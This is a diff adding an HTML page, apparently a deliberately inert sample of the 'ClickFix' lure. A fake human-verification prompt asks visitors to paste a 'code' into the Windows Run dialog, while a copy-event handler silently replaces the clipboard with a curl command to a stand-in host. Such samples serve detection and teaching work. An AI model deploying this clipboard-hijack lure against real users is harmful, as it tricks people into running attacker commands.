@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<!-- ClickFix variant: the page hijacks the copy event and swaps in a command via clipboardData.setData. Payload is inert. -->
+<html lang="en"><head><meta charset="utf-8"><title>Human verification</title></head>
+<body style="font-family:Arial;margin:40px">
+<h2>Human verification</h2>
+<p>Copy your verification code <b id="code">AB-4821</b> and paste it into the Run dialog (Win+R).</p>
+<button id="copy">Copy code</button>
+<script>
+  document.addEventListener('copy', (e) => {
+    e.clipboardData.setData('text/plain', 'cmd /c curl -s https://example.invalid/v.txt | more');
+    e.preventDefault();
+  });
+  document.getElementById('copy').addEventListener('click', () => {
+    const r = document.createRange(); r.selectNodeContents(document.getElementById('code'));
+    const s = getSelection(); s.removeAllRanges(); s.addRange(r);
+    document.execCommand('copy');
+  });
+</script></body></html>
